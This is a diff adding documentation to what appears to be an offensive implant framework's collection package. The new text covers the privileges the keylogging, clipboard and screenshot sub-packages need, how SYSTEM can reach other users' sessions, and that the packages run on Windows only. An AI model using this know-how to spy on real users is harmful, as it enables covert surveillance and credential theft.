@@ -24,6 +24,23 @@
 // Clipboard polling is `quiet`. Screenshot via GDI is `quiet` and
 // blends with benign software.
 //
+// # Required privileges
+//
+// Per sub-package. `keylog` and `clipboard` are unprivileged
+// for the active interactive session — their hooks live in the
+// caller's window-station / desktop, so they capture only what
+// the implant's session can already see. `screenshot` is
+// unprivileged for the same reason; capturing another user's
+// session needs SYSTEM + the right session/desktop attach.
+// SYSTEM in session 0 captures nothing useful from interactive
+// users without `process/session` first switching the desktop.
+//
+// # Platform
+//
+// Windows-only across the three sub-packages. Each is gated by
+// `//go:build windows` and depends on user32 / gdi32 / WH_*
+// hooks that have no cross-platform analogue.
+//
 // # See also
 //
 //   - docs/techniques/collection/README.md
